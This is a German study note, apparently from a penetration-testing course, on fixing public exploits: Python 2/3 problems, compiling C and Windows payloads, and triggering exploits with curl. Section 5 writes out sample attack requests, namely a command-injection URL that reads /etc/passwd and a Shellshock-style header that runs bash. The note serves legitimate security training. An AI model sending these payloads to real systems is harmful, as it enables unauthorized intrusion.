# 🛠️ Exploit-Troubleshooting (Errors, Python-Versionen, Kompilieren)

> **Prof-Hinweis:** "Immer auf Errors achten — nur weil ein Exploit einen Error wirft, heißt
> es nicht, dass es der falsche ist. Auf Version achten, den Fehler googeln, vllt gibt es
> Anleitungen, wie man was kompilieren muss, um Errors zu umgehen."

---

## 1. Python-Version umstellen (häufigste Exploit-Falle)

Viele ältere PoCs (exploit-db) sind **Python 2**. Symptome: `SyntaxError: Missing parentheses
in call to 'print'`, `print "..."`, `urllib2`, `except Exception, e`.

```bash
python --version ; python2 --version ; python3 --version

# Mit der richtigen Version starten
python2 exploit.py <args>          # für alte PoCs
python3 exploit.py <args>

# 2to3 schnell drüber (oft reicht's)
2to3 -w exploit.py

# Fehlt python2?
sudo apt install python2
# pip für python2:
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o gp.py && python2 gp.py
```

Typische manuelle Fixes in Py2-PoCs:
```
print "x"            -> print("x")
except Exception, e  -> except Exception as e
import urllib2       -> import urllib.request as urllib2   (oder mit py2 laufen lassen)
```

---

## 2. C-Exploit kompilieren (Linux-Kernel / lokale Exploits)

```bash
gcc exploit.c -o exploit                       # Standard
gcc -pthread exploit.c -o exploit -lcrypt      # häufige Flags bei Kernel-PoCs
gcc -m32 exploit.c -o exploit                  # 32-bit Ziel
# Fehlende Header? -> Fehlermeldung googeln, passendes -lXYZ ergänzen
```

> Auf dem Ziel oft **kein** gcc → auf Kali kompilieren und Binary rüberschieben
> ([file-transfer](../99-Resources/file-transfer.md)). Achtung: Architektur/glibc müssen passen,
> sonst statisch bauen: `gcc -static exploit.c -o exploit`.

## 3. Windows-EXE auf Kali bauen (mingw)

```bash
x86_64-w64-mingw32-gcc payload.c -o payload.exe        # 64-bit
i686-w64-mingw32-gcc   payload.c -o payload.exe        # 32-bit
```

---

## 4. Allgemeines Error-Mindset

1. **Exakte Fehlermeldung googeln** (in Anführungszeichen) + Exploit-Name.
2. **Versionen vergleichen** — PoC für 1.3.5, Ziel hat 1.3.5a? Oft trotzdem anpassbar.
3. **README/Kommentare im PoC lesen** — viele nennen genau die nötigen Build-Schritte.
4. **LHOST/LPORT/RHOST/Target-URI** im Skript hartcodiert? → anpassen.
5. **curl statt Python** zum Triggern probieren (oft robuster, siehe unten).

## 5. curl als Exploit-Trigger (statt Python-PoC)

> **Prof-Hinweis:** "curl als Exploit-Trigger mal anschauen (besser als Python bei einer Maschine)."

Wenn ein PoC nur einen präparierten HTTP-Request absetzt, kann man das oft direkt mit `curl`
nachbauen — schneller und ohne Python-Abhängigkeiten:

```bash
# Beispiel: parametrisierter Request mit URL-Encoding
curl -s "http://$RHOST/vuln.php?cmd=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("id;cat /etc/passwd"))')"

# POST mit Payload
curl -s -X POST http://$RHOST/endpoint -d 'param=<payload>' -H 'Content-Type: application/x-www-form-urlencoded'

# Header-basierter Trigger
curl -s http://$RHOST/ -H 'User-Agent: () { :; }; /bin/bash -c "id"'    # Shellshock-Stil
```

→ Encoding-Helfer (URL/Base64): [encoding.md](../99-Resources/encoding.md)
